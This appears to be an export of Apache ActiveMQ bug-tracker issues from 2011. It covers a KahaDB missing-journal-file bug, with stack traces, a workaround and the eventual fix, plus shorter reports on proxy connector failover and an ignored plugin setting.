--------------------------

It doesn't happen consistently, but it has happened numerous times.  The only way to ""fix"" it is to kill the app, blow away the KahaDB data directory, and restart (ugh).

Unfortunately this issue is not reproduceable.

Here's the embedded broker config, fwiw:
--------------------------
  <broker xmlns=""http://activemq.apache.org/schema/core""
          id=""embeddedActivemqBroker""
          useJmx=""false""
          persistent=""true""
          dataDirectory=""/usr/local/embedded/activemq-data""
          schedulerSupport=""false""
          advisorySupport=""false""
          enableStatistics=""true"">
    <destinationPolicy>
      <policyMap>
        <policyEntries>
          <policyEntry queue="">"" producerFlowControl=""false"" memoryLimit=""20mb""/>
        </policyEntries>
      </policyMap>
    </destinationPolicy>
  </broker>
-------------------------- ","linux: CentOS 5.5
happens on both dual- and quad-cpu boxes, 4gb ram

java version ""1.6.0_21""
Java(TM) SE Runtime Environment (build 1.6.0_21-b06)
Java HotSpot(TM) 64-Bit Server VM (build 17.0-b16, mixed mode)",alisenberg,dcheckoway,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3122,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14684,,,Mon Feb 14 13:20:24 UTC 2011,,,,,,,,,,,"0|i0ak33:",59527,,,,,,,,,,,,,,,,,,,,,"20/Jan/11 16:21;redvortex;Hello,

We're experiencing the very same issue and I'm also running ActiveMQ 5.4.2. We also have a high quantity of messages, at least 30,000 messages per hours sometimes much more (2x, 3x) than that. We have a mix of very large (fews megs) and very small (few bytes) messages.

What happens: a kaha db missing log (probably deleted too early by kahadb or something else) then messages start accumulating and my consumers are unable to dequeue them.

This issue is really major, if not blocker. This is new since we upgraded to 5.4.2, we never had this problem before with version 5.3.x. I'm unable to reproduce it and it happens randomly, under heavy load or not.

We're running CentOS 4.6, 32 bits.

I found a temporary work around by adding this parameter to the kahadb config, restarting the broker, wait until all the queued messages are consumed, then removing the parameter and restarting the broker again.

{noformat}
<persistenceAdapter>
            <kahaDB directory=""${activemq.base}/data/kahadb"" ignoreMissingJournalfiles=""true""/>
</persistenceAdapter>
{noformat}

When you restart the broker with this configuration you will see this and the normal processing continues:

{noformat}
INFO   | jvm 1    | 2011/01/20 10:05:20 |  INFO | KahaDB is version 3
INFO   | jvm 1    | 2011/01/20 10:05:20 |  INFO | Recovering from the journal ...
INFO   | jvm 1    | 2011/01/20 10:05:20 |  INFO | Recovery replayed 1 operations from the journal in 0.045 seconds.
INFO   | jvm 1    | 2011/01/20 10:05:20 |  INFO | Some journal files are missing: [4311]
INFO   | jvm 1    | 2011/01/20 10:05:20 |  INFO | Detected missing/corrupt journal files.  Dropped 1 messages from the index in 0.028 seconds.
{noformat}

This workaround allows me to at least not lose all the DB like I had to do until today (delete the kahadb folder and restart).

Here is what starts showing over and over again in the wrapper.log when the issue appears:

{noformat}
INFO   | jvm 1    | 2011/01/20 07:31:00 | ERROR | Looking for key 4311 but not found in fileMap: {3944=db-3944.log number = 3944 , length = 33760316, 406
7=db-4067.log number = 4067 , length = 33590177, 3947=db-3947.log number = 3947 , length = 33677680, 3948=db-3948.log number = 3948 , length = 33596726, 
4068=db-4068.log number = 4068 , length = 33755827, 4075=db-4075.log number = 4075 , length = 34048968, 4322=db-4322.log number = 4322 , length = 3004262
2, 4076=db-4076.log number = 4076 , length = 33734622, 4320=db-4320.log number = 4320 , length = 33622170, 4321=db-4321.log number = 4321 , length = 3360
7934, 3943=db-3943.log number = 3943 , length = 33897766, 3961=db-3961.log number = 3961 , length = 33715187, 3960=db-3960.log number = 3960 , length = 3
3634841, 4021=db-4021.log number = 4021 , length = 33584217, 4022=db-4022.log number = 4022 , length = 33569989, 4090=db-4090.log number = 4090 , length 
= 33555654, 3955=db-3955.log number = 3955 , length = 33566643, 4030=db-4030.log number = 4030 , length = 33700887, 4091=db-4091.log number = 4091 , leng
th = 33928309, 4031=db-4031.log number = 4031 , length = 33554494, 3889=db-3889.log number = 3889 , length = 33664097, 3956=db-3956.log number = 3956 , l
ength = 33621892, 3890=db-3890.log number = 3890 , length = 33590196, 4035=db-4035.log number = 4035 , length = 33653742, 4034=db-4034.log number = 4034 
, length = 33852330, 3912=db-3912.log number = 3912 , length = 33554464, 3913=db-3913.log number = 3913 , length = 33587386, 4101=db-4101.log number = 41
01 , length = 34013592, 4039=db-4039.log number = 4039 , length = 34009512, 4100=db-4100.log number = 4100 , length = 33576394, 4038=db-4038.log number =
 4038 , length = 33564352, 4102=db-4102.log number = 4102 , length = 33630267, 3908=db-3908.log number = 3908 , length = 33660034, 3909=db-3909.log numbe
r = 3909 , length = 33570972, 4317=db-4317.log number = 4317 , length = 33554634, 4316=db-4316.log number = 4316 , length = 33554832, 4319=db-4319.log nu
mber = 4319 , length = 33560765, 3929=db-3929.log number = 3929 , length = 33773224, 4318=db-4318.log number = 4318 , length = 33606627, 3928=db-3928.log
 number = 3928 , length = 33575213, 4313=db-4313.log number = 4313 , length = 33666992, 3935=db-3935.log number = 3935 , length = 33716752, 4312=db-4312.
log number = 4312 , length = 33554827, 3934=db-3934.log number = 3934 , length = 33584253, 4315=db-4315.log number = 4315 , length = 33633620, 4314=db-43
14.log number = 4314 , length = 33676339}
INFO   | jvm 1    | 2011/01/20 07:31:00 | ERROR | Failed to fill batch
INFO   | jvm 1    | 2011/01/20 07:31:00 | java.io.IOException: Could not locate data file /usr/share/activemq/data/kahadb/db-4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.read(Journal.java:592)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:4
85)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.lang.Thread.run(Thread.java:619)
INFO   | jvm 1    | 2011/01/20 07:31:00 | ERROR | Failed to fill batch
INFO   | jvm 1    | 2011/01/20 07:31:00 | java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/share/activemq/data/kahadb/db-
4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.lang.Thread.run(Thread.java:619)
INFO   | jvm 1    | 2011/01/20 07:31:00 | Caused by: java.io.IOException: Could not locate data file /usr/share/activemq/data/kahadb/db-4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.read(Journal.java:592)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:4
85)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       ... 10 more
INFO   | jvm 1    | 2011/01/20 07:31:00 | ERROR | Failed to page in more queue messages 
INFO   | jvm 1    | 2011/01/20 07:31:00 | java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/sh
are/activemq/data/kahadb/db-4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:113)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at java.lang.Thread.run(Thread.java:619)
INFO   | jvm 1    | 2011/01/20 07:31:00 | Caused by: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/share/activemq/data
/kahadb/db-4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       ... 9 more
INFO   | jvm 1    | 2011/01/20 07:31:00 | Caused by: java.io.IOException: Could not locate data file /usr/share/activemq/data/kahadb/db-4311.log
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.journal.Journal.read(Journal.java:592)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:4
85)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
INFO   | jvm 1    | 2011/01/20 07:31:00 |       ... 10 more
{noformat}


;;;","21/Jan/11 17:50;gtully;think this issue is resolved with the fix for https://issues.apache.org/jira/browse/AMQ-3122

the fix makes a checkpoint (with the index lock obtained) do a sync write to the journal. This ensures that the lastAppendLocation is up to date for a cleanup. Without the sync write, it is possible that another write is queued which rolls over the journal and creates another journal data file that can get cleaned up in error.
;;;","21/Jan/11 19:09;redvortex;Thanks for the reply.

I definitely would like to have a patched-5.4.2 or even better, a 5.4.3 that would include more patches, if possible.

Unless, of course, 5.5 is to be released very soon, is there any date for 5.5, yet ?;;;","21/Jan/11 20:21;dcheckoway;@Gary, AMQ-3122 talks about broker running out of disk space being a cause.  Can you clarify if that means actually running out of physical space on the disk, or hitting a systemUsage limit for storeUsage or something like that?  I can tell you definitively that our setup did NOT run out of physical disk space.  Whether it hit the storeUsage limit or not (it wasn't explicitly configured, so whatever is the default), that's another story...

Thanks for following up on this!;;;","21/Jan/11 22:16;gtully;@Dan, it is the fix (code change) that helps rather than there being a match for the symptoms. Try out a 5.5-SNAPSHOT to validate: https://repository.apache.org/content/repositories/snapshots/org/apache/activemq/apache-activemq/;;;","21/Jan/11 22:28;dcheckoway;@Gary, since I haven't been able to reproduce this issue in anything other than our production environment (in which I'm not too comfortable running a SNAPSHOT), I may have to wait for the official 5.5 release.  I can't reproduce it locally with 5.4.2, let alone a newer snapshot.  :-)

FWIW, it has been a couple of weeks (and a couple of billion messages!) since we've seen this error in production with 5.4.2.  It comes and goes at random.  One week we'll have a couple of our servers hit this issue, the next week it's all hunky dory.

Looking forward to 5.5.  Thanks!;;;","23/Jan/11 14:04;dcheckoway;@Patrick,  I just wanted to say THANK YOU for the ignoreMissingJournalfiles=""true"" trick.  That saved us from losing about 350k messages today on one of our producer nodes.  Its embedded broker's KahaDB (5.4.2) started freaking out again with:

ERROR; Jan 23, 2011 13:22:33 PM; tid:BrokerService[localhost] Task; AbstractStoreCursor - Failed to fill batch
java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
        at org.apache.kahadb.journal.Journal.read(Journal.java:592)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)
        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
ERROR; Jan 23, 2011 13:22:33 PM; tid:BrokerService[localhost] Task; AbstractStoreCursor - Failed to fill batch
java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
        at org.apache.kahadb.journal.Journal.read(Journal.java:592)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)
        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
        ... 10 more
ERROR; Jan 23, 2011 13:22:33 PM; tid:BrokerService[localhost] Task; Queue - Failed to page in more queue messages
java.lang.RuntimeException: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:113)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1678)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1898)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1425)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)
Caused by: java.lang.RuntimeException: java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:265)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:110)
        ... 9 more
Caused by: java.io.IOException: Could not locate data file /usr/local/mycompany/activemq-data/db-2426.log
        at org.apache.kahadb.journal.Journal.getDataFile(Journal.java:345)
        at org.apache.kahadb.journal.Journal.read(Journal.java:592)
        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:786)
        at org.apache.activemq.store.kahadb.KahaDBStore.loadMessage(KahaDBStore.java:956)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$5.execute(KahaDBStore.java:494)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recoverNextMessages(KahaDBStore.java:485)
        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:88)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:97)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:262)
        ... 10 more
ERROR; Jan 23, 2011 13:22:33 PM; tid:BrokerService[localhost] Task; Journal - Looking for key 2426 but not found in fileMap: {2443=db-2443.log number = 2443 , length = 33556647, 2442=db-2442.log number = 2442 , length = 33555394, 2441=db-2441.log number = 2441 , length = 33556656, 2440=db-2440.log number = 2440 , length = 33554618, 2444=db-2444.log number = 2444 , length = 31211881, 2435=db-2435.log number = 2435 , length = 33555525, 2434=db-2434.log number = 2434 , length = 33556971, 2433=db-2433.log number = 2433 , length = 33554878, 2432=db-2432.log number = 2432 , length = 33554516, 2439=db-2439.log number = 2439 , length = 33555167, 2438=db-2438.log number = 2438 , length = 33555794, 2437=db-2437.log number = 2437 , length = 33555470, 2436=db-2436.log number = 2436 , length = 33555079, 2335=db-2335.log number = 2335 , length = 33555466, 2334=db-2334.log number = 2334 , length = 33555013, 2333=db-2333.log number = 2333 , length = 33555566, 2336=db-2336.log number = 2336 , length = 33583503, 2337=db-2337.log number = 2337 , length = 33556154, 2338=db-2338.log number = 2338 , length = 33556881, 2339=db-2339.log number = 2339 , length = 33554898, 2340=db-2340.log number = 2340 , length = 33555842, 2341=db-2341.log number = 2341 , length = 33556432, 2342=db-2342.log number = 2342 , length = 33554605, 2429=db-2429.log number = 2429 , length = 33555998, 2428=db-2428.log number = 2428 , length = 33555914, 2431=db-2431.log number = 2431 , length = 33556386, 2430=db-2430.log number = 2430 , length = 33554851, 2427=db-2427.log number = 2427 , length = 33556238}

5.5 can't come quickly enough!  :-)
;;;","24/Jan/11 13:08;gtully;resolving following user feedback on snapshots;;;","31/Jan/11 09:53;dejanb;For anyone interested there's a 5.4.2-fuse-01-00 release, that contains this fix. You can download it from http://fusesource.com;;;","07/Feb/11 19:28;lei;I'm new to fuse. Could someone help me, how can I find and download a specific release (5.4.2-fuse-01-00) on fusesource.com?

Thanks,
Lei;;;","14/Feb/11 13:16;gtully;Unit test (org.apache.activemq.bugs.AMQ3120Test) shows intermittent failure, so the problem still exists.;;;","14/Feb/11 13:20;gtully;fix committed in http://svn.apache.org/viewvc?rev=1070484&view=rev
interleaved checkpoint with journal add could cause inadvertent increment on the last update location, leaving current journal file as a gc candidate. resulting in the exception and hung destination.
Fix keeps lastUpdate independent of the current checkpoint.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Proxy connector stop sending messages after failover,AMQ-3119,12494843,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,06/Jan/11 13:39,10/Jan/11 13:32,14/Jul/23 05:43,10/Jan/11 13:32,5.4.2,,,,,5.5.0,,,,,,,0,,,,,,,,,"If the proxy connector is connected to the remote broker using failover transport like 

{code}
          <proxyConnector bind=""tcp://localhost:51618"" remote=""failover:(tcp://localhost:61616)"" 
                proxyToLocalBroker=""true""        
          />
{code}

and the connection to the remote broker is stopped and started again, the consumer listening to the proxy port will stop receiving messages.

However, if openwire cache is disabled on the consumer side, everything works as expected

{code}tcp://localhost:51618?wireFormat.cacheEnabled=false{code}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14780,,,Mon Jan 10 13:32:07 UTC 2011,,,,,,,,,,,"0|i0ak3b:",59528,,,,,,,,,,,,,,,,,,,,,"10/Jan/11 13:32;dejanb;Fixed with svn revision 1057186;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
reportInterval property ignored by DiscardingDLQBrokerPlugin,AMQ-3115,12494706,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,05/Jan/11 10:21,05/Jan/11 10:28,14/Jul/23 05:43,05/Jan/11 10:28,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"I have a project where I'm trying to use a BrokerService with the
DiscardingDLQBrokerPlugin in code, and I don't want/need the log messages
created for the number of discarded messages.

Eg:

broker_serv = new BrokerService();
plugins[] = new BrokerPlugin[1];
ddlq_plugin = new DiscardingDLQBrokerPlugin();
...
ddlq_plugin.setDropAll(true);
ddlq_plugin.setReportInterval(0);
plugins[0] = ddlq_plugin;

broker_serv.setPlugins(plugins);
broker_serv.start();

Yet, in the DiscardingDLQBrokerPlugin the installPlugin() method doesn't
pass its reportInterval to the DiscardingDLQBroker it creates. So the
DiscardingDLQBroker uses its default reportingInterval of 1000, and no
matter what I do with ddlq_plugin.setReportInterval(x) the reporting
interval is always 1000.

